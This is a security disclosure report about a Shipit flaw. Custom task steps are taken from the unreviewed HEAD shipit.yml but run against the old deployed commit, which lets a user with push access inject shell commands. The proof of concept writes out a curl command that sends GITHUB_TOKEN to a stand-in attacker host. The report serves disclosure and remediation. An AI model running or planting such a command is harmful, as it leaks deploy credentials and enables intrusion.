### Title
Custom task steps are read from the un-deployed HEAD spec while execution runs against a stale checked-out commit, allowing an unreviewed push to inject arbitrary shell commands into deploys - ([File: app/models/shipit/stack.rb])

### Summary
`Stack#trigger_task` binds a task's executable `steps` to whatever commit `cached_deploy_spec` currently reflects (the newest commit reachable on the branch), while the task is actually run against `last_deployed_commit`'s checked-out working directory. Because `cached_deploy_spec` is refreshed automatically on every push (independent of any deploy/approval), a plain `git push` to the tracked branch can rewrite a task's `steps` in `shipit.yml` and have those attacker-controlled shell commands executed on the deploy host the next time any legitimate Shipit user triggers that custom task — without that push ever being deployed, reviewed, or checked out.

### Finding Description
`Stack#trigger_task` resolves the task definition from `cached_deploy_spec`, not from the commit that will actually be checked out and run: [1](#0-0) 

`cached_deploy_spec` is delegated straight to the `DeploySpec`'s `find_task_definition`/`task_definitions`, and is kept in sync with the **latest reachable commit** on the branch by `CacheDeploySpecJob`, which runs automatically after every push via `GithubSyncJob` — with no deploy, review, or approval required: [2](#0-1) [3](#0-2) 

The resulting `TaskDefinition` (created from that HEAD spec) carries the raw shell command strings directly: [4](#0-3) 

This `TaskDefinition` is serialized onto the `Task` record at creation time via `serialize :definition, coder: TaskDefinition`: [5](#0-4) 

But the task itself is bound to `last_deployed_commit` (the approved/deployed ref), not the HEAD commit whose spec supplied the steps: [6](#0-5) 

At execution time, `TaskCommands#steps` simply replays the pre-serialized, HEAD-derived command strings verbatim as shell commands, independent of what was checked out to the working directory: [7](#0-6) 

This breaks the binding: `ref approved/deployed (last_deployed_commit checked out) == ref whose shipit.yml steps actually execute (HEAD via cached_deploy_spec)`. A contributor with only GitHub push access to the branch (not Shipit deploy authorization) can push a commit that edits a custom task's `steps` in `shipit.yml`. That edit is picked up by `CacheDeploySpecJob` within moments, well before (or entirely without) any deploy of that commit. When any authorized Shipit user later clicks "trigger task" for that action, the malicious step runs on the deploy host with its GitHub credentials and any other secrets in its environment, even though the checked-out working directory is still at the old, reviewed `last_deployed_commit`.

### Impact Explanation
This is remote code execution on the deploy host: an unprivileged (from Shipit's perspective) GitHub committer can inject shell commands that execute with the deploy machine's `GITHUB_TOKEN` and other environment secrets, without their commit ever being deployed or reviewed by anyone with Shipit-level authorization. This matches the Critical impact bar (RCE on the deploy host / exfiltration of `GITHUB_TOKEN`).

### Likelihood Explanation
Likelihood is high for any repository where Shipit-authorized users regularly trigger custom tasks (a common feature, e.g. "restart", "flush_cache") and where push access to the tracked branch is broader than the set of users trusted to author `shipit.yml` deploy logic (e.g. via feature branches merged by CI bots, less-trusted contributors, or compromised low-privilege accounts). No Shipit session, API token, or webhook secret is required by the attacker — only ordinary git push access, which is the same trust level assumed compromised in the underlying analog report (a caller able to reach one code path but not the fully-guarded one).

### Recommendation
Bind the task's executable steps/definition to the same commit the task actually checks out and runs against (e.g., resolve `find_task_definition` from the `DeploySpec` computed for `until_commit`, not from the stack's HEAD-tracking `cached_deploy_spec`), or refuse to run custom tasks whose definition commit differs from the commit currently checked out/deployed.

### Proof of Concept
1. Attacker has push access to the tracked branch of a Shipit-managed repository, but is not a member of the `Shipit.github_teams` authorized to trigger deploys.
2. Attacker pushes a commit modifying an existing custom task's `steps` in `shipit.yml`, e.g. changing `flush_cache`'s steps to `curl https://attacker.example/steal -d "$GITHUB_TOKEN"`.
3. `GithubSyncJob`/`CacheDeploySpecJob` runs automatically and updates `stack.cached_deploy_spec` to reflect this new commit — the attacker's commit is never deployed.
4. A legitimate, authorized Shipit user triggers the `flush_cache` task via the UI/API (`Stack#trigger_task('flush_cache', user)`).
5. `find_task_definition('flush_cache')` resolves the malicious `steps` from `cached_deploy_spec` (HEAD), while the task's `until_commit`/`since_commit` remain the old `last_deployed_commit`.
6. `PerformTaskJob` → `TaskExecutionStrategy::Default` checks out the old commit but `TaskCommands#steps` executes the malicious command string taken from the serialized `TaskDefinition`, running it on the deploy host with its credentials.

    def trigger_task(definition_id, user, env: nil, force: false)
      definition = find_task_definition(definition_id)
      env = env.to_h

      definition.variables_with_defaults.each do |variable|
        env[variable.name] ||= variable.default
      end

      commit = last_deployed_commit.presence || commits.first
      task = tasks.create(
        user_id: user.id,
        definition:,
        until_commit_id: commit.id,
        since_commit_id: commit.id,
        env: definition.filter_envs(env),
        allow_concurrency: definition.allow_concurrency? || force,
        ignored_safeties: force
      )
      task.enqueue
      task
    end
